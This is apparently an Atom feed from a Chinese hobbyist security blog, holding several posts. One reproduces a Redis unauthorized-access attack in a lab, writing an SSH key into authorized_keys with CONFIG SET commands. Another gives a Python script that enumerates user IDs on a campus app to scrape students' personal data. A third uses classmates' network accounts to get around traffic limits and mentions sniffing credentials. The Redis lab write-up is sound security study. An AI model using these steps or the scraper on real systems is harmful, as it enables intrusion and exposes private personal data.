<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>折戟</title>
  <icon>https://www.gravatar.com/avatar/8ef68a22378880474ce46579bc9fdf1a</icon>
  <subtitle>安全爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rliyuqing.github.io/"/>
  <updated>2019-11-13T13:47:05.843Z</updated>
  <id>https://rliyuqing.github.io/</id>
  
  <author>
    <name>折戟</name>
    <email>raosong3374@gmail.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>redis未授权访问漏洞</title>
    <link href="https://rliyuqing.github.io/2019/04/15/2.%20redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://rliyuqing.github.io/2019/04/15/2. redis未授权访问漏洞/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:47:05.843Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><hr><h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="redis是什么？"><a href="#redis是什么？" class="headerlink" title="redis是什么？"></a>redis是什么？</h3><p>通过查阅资料可知，redis即为key-value数据库中的一种。这有点用名词解释名词了，但是这有必要先解释一下key-value数据库。<br>Key-value数据库顾名思义就是利用键和数据值相对应存储的一种数据库，就类似于java中的map。我们整个数据库就可以看成一个大的map，在map中一个特地的key对应一个唯一的value。<br>同时我们redis作为key-value数据库的一种他支持很多很多的value的类型，redis也是一种内存型的数据库，所以可以提供高效率的读写，但同时他占用cpu将会很高。在内存上操作， 我们很容易想到数据的持久化的问题，不用担心，redis可以将数据持久化到硬盘中，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。<br>看看网上说的reids相对于其他key-value数据库的三大优点：<br>·Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。<br>·Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。<br>·Redis支持数据的备份，即master-slave模式的数据备份。</p><h3 id="redis未授权访问漏洞-1"><a href="#redis未授权访问漏洞-1" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h3><p>Redis在默认情况会将服务绑定在0.0.0.0:6379上，从而将服务暴露在公网环境下，如果在没有开启安全认证的情况下，可以导致任意用户未授权访问Redis服务器并Redis进行读写操作。攻击者在未授权访问Redis服务器时可以通过上传公钥的方法将自己的公钥上传到Redis服务器上，达到免密登陆的效果。</p><h3 id="具体漏洞描述"><a href="#具体漏洞描述" class="headerlink" title="具体漏洞描述"></a>具体漏洞描述</h3><p>Redis 安全模型的观念是: “请不要将 Redis 暴露在公开网络中, 因为让不受信任的客户接触到 Redis 是非常危险的” 。<br>Redis 作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。<br>因为其他受信任用户需要使用 Redis 或者因为运维人员的疏忽等原因，部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致<br>Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。<br>利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>如果攻击者进入了我们的redis服务器，他便可以自由下载数据库中的文件，造成信息泄露，造成个人隐私泄露或者公司机密泄露，造成巨大损害。同时如果攻击者进行提权获取更大的权限，还会产生更大的危害。<br>我尝试使用Shodan对公网上的开放的redis进行搜索（port:6379）：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7fc09c6976b6b496.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>我们可以看到一共有87881个结果，其中我国位列榜首。。。。国人的安全意识还是有待提高。<br>看一下具体地图分布吧：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-8b7e33954b786784.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>两次搜索数量有一点不一样。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4f7cad8bdf84c769.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>榜首竟然是杭州阿里巴巴。</p><h2 id="漏洞的复现和利用"><a href="#漏洞的复现和利用" class="headerlink" title="漏洞的复现和利用"></a>漏洞的复现和利用</h2><h3 id="安装redis（我采用源码安装）"><a href="#安装redis（我采用源码安装）" class="headerlink" title="安装redis（我采用源码安装）"></a>安装redis（我采用源码安装）</h3><h4 id="首先下载源码然后编译安装"><a href="#首先下载源码然后编译安装" class="headerlink" title="首先下载源码然后编译安装"></a>首先下载源码然后编译安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-4.0.6.tar.gz</span><br><span class="line">$ tar xzf redis-4.0.6.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> redis-4.0.6</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>编译完成：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-2d19a664cbbf55d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf（这个在安装目录）。然后拷贝到一个目录下。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir /usr/redis</span><br><span class="line">$ cp redis-server  /usr/redis</span><br><span class="line">$ cp redis-benchmark /usr/redis</span><br><span class="line">$ cp redis-cli  /usr/redis</span><br><span class="line">$ cp redis.conf  /usr/redis</span><br><span class="line">$ <span class="built_in">cd</span> /usr/redis</span><br></pre></td></tr></table></figure></p><h4 id="开启redis服务"><a href="#开启redis服务" class="headerlink" title="开启redis服务"></a>开启redis服务</h4><p>直接进入刚刚创建的redis文件夹后执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./redis-server ./redis.conf</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-91c08afaf7ce1fe8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p><h4 id="检查是否成功开启"><a href="#检查是否成功开启" class="headerlink" title="检查是否成功开启"></a>检查是否成功开启</h4><p><img src="http://upload-images.jianshu.io/upload_images/6269327-dcf471aeeacd9fbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p><h4 id="配置redis，使他处于漏洞状态"><a href="#配置redis，使他处于漏洞状态" class="headerlink" title="配置redis，使他处于漏洞状态"></a>配置redis，使他处于漏洞状态</h4><p>我直接开启了redis，此时没有认证，redis的默认就是这样，然后我只需要将redis更改绑定在0.0.0.0:6379就可以，在redis.conf里面更改就行了。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d5816eceeec8f77a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p><h4 id="尝试使用namp扫描了一下我的6379端口"><a href="#尝试使用namp扫描了一下我的6379端口" class="headerlink" title="尝试使用namp扫描了一下我的6379端口"></a>尝试使用namp扫描了一下我的6379端口</h4><p><img src="http://upload-images.jianshu.io/upload_images/6269327-edefc35b34a306a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>可以看到一下子就可扫描出信息，而且包含一下敏感信息。</p><h4 id="尝试利用redis客户端进行未授权访问"><a href="#尝试利用redis客户端进行未授权访问" class="headerlink" title="尝试利用redis客户端进行未授权访问"></a>尝试利用redis客户端进行未授权访问</h4><p><img src="http://upload-images.jianshu.io/upload_images/6269327-96f441ad5cf753d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>果然，很成功就进入了，上门查看了主机信息（信息在下面，没截图）</p><h4 id="开启公钥登录"><a href="#开启公钥登录" class="headerlink" title="开启公钥登录"></a>开启公钥登录</h4><p>生成公钥：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa //rsa加密</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-fb1eccee2bbc48d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>然后将公钥写入文本：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh/</span><br><span class="line">$ (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt; 1.txt</span><br></pre></td></tr></table></figure></p><p>将1.txt写入redis<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat 1.txt | /usr/redis/./redis-cli -h 127.0.0.1  -x <span class="built_in">set</span> crack</span><br></pre></td></tr></table></figure></p><p>利用redis客户端连接<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./redis-cli -h 127.0.0.1</span><br></pre></td></tr></table></figure></p><p>获取redis备份路径，更改redis备份路径，设置备份文件的名称为authorized_key<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ CONFIG GET dir</span><br><span class="line">$ CONFIG SET dir /home/r_song/.ssh     //更改目录到r_song下</span><br><span class="line">$ CONFIG SET dbfilename authorized_keys  </span><br><span class="line">$ CONFIG GET dbfilename     //获取确认一下更改成功</span><br><span class="line">$ Save        //保存</span><br></pre></td></tr></table></figure></p><p>然后用ssh进行连接即可(在.ssh路径执行，并先把我们虚拟机的ssh服务打开)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh –i  id_rsa ******@127.0.0.1</span><br></pre></td></tr></table></figure></p><p>就可以成功登录。</p><h2 id="使用openvas对我们存在漏洞的系统进行扫描"><a href="#使用openvas对我们存在漏洞的系统进行扫描" class="headerlink" title="使用openvas对我们存在漏洞的系统进行扫描"></a>使用openvas对我们存在漏洞的系统进行扫描</h2><h3 id="查扫描结果（在上一篇博客介绍了openvas）"><a href="#查扫描结果（在上一篇博客介绍了openvas）" class="headerlink" title="查扫描结果（在上一篇博客介绍了openvas）"></a>查扫描结果（在上一篇博客介绍了openvas）</h3><p><img src="http://upload-images.jianshu.io/upload_images/6269327-47cd19d87e363524.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>从图中我们可以看到，redis-1我是使用默认的扫描方式，然后redis2是扫描的all tcp and namp 5.1 top100扫描的但是结果不一样。我们重点看redis2这个扫描结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-723ad76a9628d6ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>可以看到扫描出了redis服务没有密码。</p><h3 id="了解openvas使用的各种插件，即nvt是什么"><a href="#了解openvas使用的各种插件，即nvt是什么" class="headerlink" title="了解openvas使用的各种插件，即nvt是什么"></a>了解openvas使用的各种插件，即nvt是什么</h3><p>Nvt（network vulnerability tests）即网络漏洞测试，是openvas中的免费的扫描插件。我可以在线同步获取这个插件（openvas-nvt-sync）或者离线下载。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-f12bb14d87c765fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br>这是我在官网上找到的openvas工作的图，可以看到，openvas的插件nvt是在openvas scanner提供服务的。nvt就是根据不同的需求调用nasl脚本进行检测。</p><h3 id="对应扫描该漏洞的nvt是什么？"><a href="#对应扫描该漏洞的nvt是什么？" class="headerlink" title="对应扫描该漏洞的nvt是什么？"></a>对应扫描该漏洞的nvt是什么？</h3><p>在扫描结果中可以找到nvt的名称，以及OID编号，在 <a href="http://www.openvas.org/openvas-nvt-feed.html" target="_blank" rel="noopener">http://www.openvas.org/openvas-nvt-feed.html</a> 中可以根据OID编号查找对应nvt的文件名是什么，然后可以在/var/lib/openvas/plugins/目录下，找到该文件。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4fc9aecc239752a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>找到指定文件：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-a12fd1dd28524475.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-1c76f50da5c85178.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br>前面是这个nvt的一些信息，比如oid，version，还有危险评分等。Family是属于database的。基本这些都是信息。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-911af7277c87e599.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>主要就是后面几行，先获取了端口信息，确定端口是否打开：get_app_port()。然后使用get_kb_item(〈name〉)函数可以获得基本信息的〈name〉项的值，这个函数是匿名函数。通过测试no_password如果成功了就说明有这个漏洞，然后退出。后面是加密信息端口号。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;redis未授权访问漏洞&quot;&gt;&lt;a href=&quot;#redis未授权访问漏
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://rliyuqing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="redis未授权访问" scheme="https://rliyuqing.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>校园提供给第三方的接口信息泄露</title>
    <link href="https://rliyuqing.github.io/2019/04/15/23.%E6%A0%A1%E5%9B%AD%E6%8F%90%E4%BE%9B%E7%BB%99%E7%AC%AC%E4%B8%89%E6%96%B9%E7%9A%84%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>https://rliyuqing.github.io/2019/04/15/23.校园提供给第三方的接口信息泄露/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:52:10.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="校园提供给第三方的接口信息泄露"><a href="#校园提供给第三方的接口信息泄露" class="headerlink" title="校园提供给第三方的接口信息泄露"></a>校园提供给第三方的接口信息泄露</h1><hr><p>之前学校和第三方合作，让我们用到的某款app，好奇测试，发现其有严重的身份验证缺失，可以随意访问个人信息，用python写了个可以爬取所有信息的脚本。（很早之前的了，做个记录）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018/6/23</span><br><span class="line"># @Author  : XDN01</span><br><span class="line"># @Site    : www.raosong.cc</span><br><span class="line"># @File    : xd-xiaoweiapp-spider.py</span><br><span class="line">import requests</span><br><span class="line">import csv</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">with open(&quot;./spider.csv&quot;,&quot;w&quot;,encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    key_array = [&apos;userId&apos;,&apos;userNum&apos;,&apos;name&apos;,&apos;sex&apos;,&apos;address&apos;,&apos;certificate&apos;,&apos;nationId&apos;,&apos;nationName&apos;,</span><br><span class="line">   &apos;phone&apos;,&apos;email&apos;,&apos;schoolName&apos;,&apos;faculty&apos;,&apos;grade&apos;,&apos;class&apos;,&apos;profession&apos;,&apos;sysStuDetailId&apos;,&apos;sourceId&apos;,</span><br><span class="line">    &apos;sourceName&apos;,&apos;feature&apos;,&apos;type&apos;,&apos;suspId&apos;]</span><br><span class="line">    writer.writerow(key_array)</span><br><span class="line"></span><br><span class="line">    for a in range(2,20):</span><br><span class="line">        url = &apos;http://example.com/search.php?userId=&#123;&#125;&apos;.format(a)</span><br><span class="line">        json_data =requests.get(url).json()[&apos;data&apos;]</span><br><span class="line">        # print(json_data)</span><br><span class="line">        value_array = []</span><br><span class="line">        for k in key_array:</span><br><span class="line">            if k in json_data:</span><br><span class="line">                value_array.append(json_data[k])</span><br><span class="line">            else:</span><br><span class="line">                value_array.append(&apos;null&apos;)</span><br><span class="line">        # print(value_array)</span><br><span class="line">        writer.writerow(value_array)</span><br><span class="line">        print(&apos;第&#123;&#125;条数据写入完成&apos;.format(a-1))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;校园提供给第三方的接口信息泄露&quot;&gt;&lt;a href=&quot;#校园提供给第三方
      
    
    </summary>
    
      <category term="水平权限" scheme="https://rliyuqing.github.io/categories/%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90/"/>
    
    
      <category term="水平权限" scheme="https://rliyuqing.github.io/tags/%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90/"/>
    
  </entry>
  
  <entry>
    <title>服务器socket代理访问darknet</title>
    <link href="https://rliyuqing.github.io/2019/04/15/31.%E6%9C%8D%E5%8A%A1%E5%99%A8socket%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AEdarknet/"/>
    <id>https://rliyuqing.github.io/2019/04/15/31.服务器socket代理访问darknet/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-22T14:44:59.695Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="服务器socket代理访问darknet"><a href="#服务器socket代理访问darknet" class="headerlink" title="服务器socket代理访问darknet"></a>服务器socket代理访问darknet</h1><hr><p>[转] <a href="https://www.zhangminghao.com/post/48.html" target="_blank" rel="noopener">原文</a><br>chrome挂tor代理从darknet上下载东西是十分的慢，而且动不动就会断，速度还慢，十分难受。决定在服务器上使用wget挂代理下载，但是wget是不支持socket5的代理的，所以不能直接使用wget指定代理参数进行代理下载darkweb的文件，最后想着直接使用Proxychains工具进行终端代理。</p><h2 id="工具下载与安装"><a href="#工具下载与安装" class="headerlink" title="工具下载与安装"></a>工具下载与安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rofl0r/proxychains-ng.git</span><br><span class="line"><span class="built_in">cd</span> proxychains-ng</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo make install-config</span><br></pre></td></tr></table></figure><h2 id="配置Proxychains"><a href="#配置Proxychains" class="headerlink" title="配置Proxychains"></a>配置Proxychains</h2><p>修改/etc/proxychains.conf文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="comment"># 将代理服务器添加到此处</span></span><br><span class="line"><span class="comment"># 格式:</span></span><br><span class="line"><span class="comment">#  socks5   192.168.67.78   1080  lamer   secret</span></span><br><span class="line"><span class="comment">#  http       192.168.89.3     8080  justu    hidden</span></span><br><span class="line"><span class="comment">#  socks4   192.168.1.49     1080</span></span><br><span class="line"><span class="comment">#  http       192.168.39.93   8080</span></span><br><span class="line"><span class="comment">#  支持的代理种类: http, socks4, socks5</span></span><br><span class="line"><span class="comment">#  支持的验证模式: "basic"-http  "user/pass"-socks</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-57d0b82c58dd93c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="使用Proxychains"><a href="#使用Proxychains" class="headerlink" title="使用Proxychains"></a>使用Proxychains</h2><p>当前Proxychains的版本是4.11，所以编译的二进制程序名是proxychains4，按以下格式使用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4  wget xxxxxxx.onion/1.txt</span><br></pre></td></tr></table></figure></p><p>再配合screen挂后台就行啦，这样就不怕下大文件动不动就断了。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-53ade32da0d164f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;服务器socket代理访问darknet&quot;&gt;&lt;a href=&quot;#服务器
      
    
    </summary>
    
      <category term="其他" scheme="https://rliyuqing.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://rliyuqing.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>简书文章图片外链403问题</title>
    <link href="https://rliyuqing.github.io/2019/04/15/30.%E7%AE%80%E4%B9%A6%E6%96%87%E7%AB%A0%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE403%E9%97%AE%E9%A2%98/"/>
    <id>https://rliyuqing.github.io/2019/04/15/30.简书文章图片外链403问题/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T17:10:40.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="简书文章图片外链403问题"><a href="#简书文章图片外链403问题" class="headerlink" title="简书文章图片外链403问题"></a>简书文章图片外链403问题</h1><hr><p>最近刚上研，所以事情比较多，一直没有注意到自己<a href="http://www.raosong.cc" target="_blank" rel="noopener">博客</a>的图片都无法访问了，都是403，后面了解才发现是简书对图片外链设置了限制，简单来说就是做了个根据http请求头中的referrer的值来验证请求是不是来自本站，如果不是就返回403或者重定向之类的。<br>可以看到简书这么做很明显是因为大部分人都把简书当做图床或者云笔记的平台来使用，高额的服务器费用，却没有代理经济价值，没有办法，只能通过这种方法来限制“白嫖用户”。<br>说说具体情况吧，我的博客是github上使用hexo搭建的，然后在简书写，写完同步到个人博客上的，简书的这个措施直接影响到我个人博客的使用了，那就只能改改呗。经过测试简书和微博的图片外链在referrer值为空也是可以访问的，所以他们的策略是只要你带了其他站点的信息就403，所以我们只要设置页面的referrer值为空就行。看了看网上的说法<br><img src="https://upload-images.jianshu.io/upload_images/6269327-37ca5e73fc4ae388.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>直接在文章里面添加<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"no-referrer"</span>/&gt;</span><br></pre></td></tr></table></figure></p><p>确实是个方法，但是我的文章太多了，一个一个加太麻烦了，而且我主页上还有图片呢，既然是hexo，直接生成静态页面的，那就直接改配置文件就行。<br>在themes/主题/layout路径里面找到生成页面的ejs文件，然后会有个head之类的ejs文件，在这里面加上上面的代码就行：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b3fa80672d620df9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可能会在下面的子目录里面，或者其他的配置文件，具体看代码怎么写的。改好之后hexo d -g就行啦。最近写的比较少了，后面会慢慢继续开始记录一下东西了。<br>不知道后面简书或者其他的平台对于图片外链会有其他的限制手段，只能见招拆招了，不过应该就是在取舍上做的一个平衡了，要是真的把图片外链限制的死死的那就真的会损是很多用户的吧，所以我对这事还是挺放心的，毕竟我也不是白嫖党。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;简书文章图片外链403问题&quot;&gt;&lt;a href=&quot;#简书文章图片外链40
      
    
    </summary>
    
      <category term="其他" scheme="https://rliyuqing.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://rliyuqing.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>python3 windows校园网自动拨号</title>
    <link href="https://rliyuqing.github.io/2019/04/15/29.python3%20windows%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A8%E6%8B%A8%E5%8F%B7/"/>
    <id>https://rliyuqing.github.io/2019/04/15/29.python3 windows校园网自动拨号/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:52:50.890Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="python3-windows校园网自动拨号"><a href="#python3-windows校园网自动拨号" class="headerlink" title="python3 windows校园网自动拨号"></a>python3 windows校园网自动拨号</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在学校基本没什么时间呆在宿舍，都在实验室。宿舍的台式基本都是用来打游戏的，特地去办个校园网觉得太亏了，但是免费的10G流量也根本不够用，更新个游戏一下就没了。突然发现本科毕业生的校园网每个人都有10G的毕业生流量，于是想着把这些账号拿来用，薅学校的羊毛。就把班上同学的账号要过来（也可以配合嗅探器来用），使用python3来自动拨号上网。</p><h2 id="小脚本"><a href="#小脚本" class="headerlink" title="小脚本"></a>小脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">def connect(username,password):</span><br><span class="line">    name=<span class="string">"宽带连接"</span></span><br><span class="line">    cmd_str=<span class="string">"rasdial %s %s %s"</span> %(name,username,password)</span><br><span class="line">    res=os.system(cmd_str)</span><br><span class="line">    <span class="keyword">if</span> res==0:</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">def disconnect():</span><br><span class="line">    name=<span class="string">"宽带连接"</span></span><br><span class="line">    cmdstr=<span class="string">"rasdial %s /disconnect"</span> %name</span><br><span class="line">    os.system(cmdstr)</span><br><span class="line">    time.sleep(5)</span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    f=open(<span class="string">"info.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">    i=0</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        i=i+1</span><br><span class="line">        line=line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="built_in">print</span>(line[0:11],line[12:20])</span><br><span class="line">        <span class="keyword">if</span>(connect(line[0:11],line[12:20]) == True):</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="comment"># disconnect()</span></span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>代码很简单就是一个，其实就是一个windows 内置的拨号连接命令rasdial的使用而已。在windows的cmd中可以查看具体参数以及功能。这个脚本从info.txt这个文件中读取校园网账号密码，然后拨号，遇到账号密码错误的情况，5s后就会自动重拨，直到拨上为止。这个info.txt其是配合嗅探器，在学校图书馆嗅探来获取确实很刺激，但是就太嫑脸了，同学的一些账号就够用了。（额，后面的处理格式的方式看起来有点傻:）<br>还有一些小bug，我们的校园网超过10G之后也是可以拨上的，但是会进行限速，很慢很慢，所以准备在脚本中加入测网速的模块，有现成的，还没加上，有空就加上。</p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>脚本写好了，接着利用windows的计划任务功能来设置脚本自启动。<br>新建一个计划任务，然后取名：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-03d1caaaf048575f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"><br>接着选择触发器，就是脚本执行的触发条件，我们设置为用户登录时，只要有用户登录就进行自动拨号。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-950abd4fe766acd6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2"><br>最后执行选择启动程序，其中第一项程序或脚本就是我们执行脚本的编译器的路径，这里我用的是anaconda的python。第二项参数就是我们所执行的文件了，比如我们所执行的文件在C盘根目录，填的就是C:/test.py。最后一项比较关键，起始于，这个网上说法不同，根据试验，应该是脚本执行的位置，就是比如我们这里的自动拨号的脚本connect.py，如果没有填写起始于选项执行时就会出现找不到info.txt文件，所以我们要将起始于这个选项填到脚本所在路径。然后就可以啦，可以注销看看自动拨号。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b734a256d428c671.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3"><br>还有补充会继续完善。</p>]]></content>
    
    <summary type="html">
    
      
      
